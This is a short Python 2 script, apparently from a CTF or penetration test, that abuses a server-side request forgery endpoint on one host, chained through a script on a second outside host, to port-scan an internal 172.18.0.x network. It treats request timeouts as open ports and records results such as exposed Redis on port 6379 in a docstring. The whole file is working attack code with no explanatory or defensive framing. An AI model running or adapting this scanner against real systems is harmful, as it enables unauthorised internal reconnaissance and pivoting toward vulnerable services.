#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
50:22  Open
33:80  Open
5:6379  Open
121:6379  Open
'''

import requests
import threading
import Queue
import time

threads_count = 1
que = Queue.Queue()
lock = threading.Lock()
threads = []
ports = [21,22,23,80,6379,8080,2222]

for i in ports:
    que.put(str(i))


def run():
    while que.qsize() > 0:
        p = que.get()
        for ip in range(1, 255):
	        try:
	            url = "http://54.223.247.98:2222/tools.php?a=s&u=http://23.83.230.6/exp.php?s=tcp%26i=172.18.0.{ip}%26p={port}".format(ip=str(ip),port=p)
	            #print url
	            time.sleep(0.3)
	            r = requests.get(url,timeout=1.8)
	        except:
	            lock.acquire()
	            print "{ip}:{port}  Open".format(ip=ip, port=p)
	            lock.release()


for i in range(threads_count):
    t = threading.Thread(target=run)
    threads.append(t)
    t.setDaemon(True)
    t.start()
while que.qsize() > 0:
    time.sleep(1.0)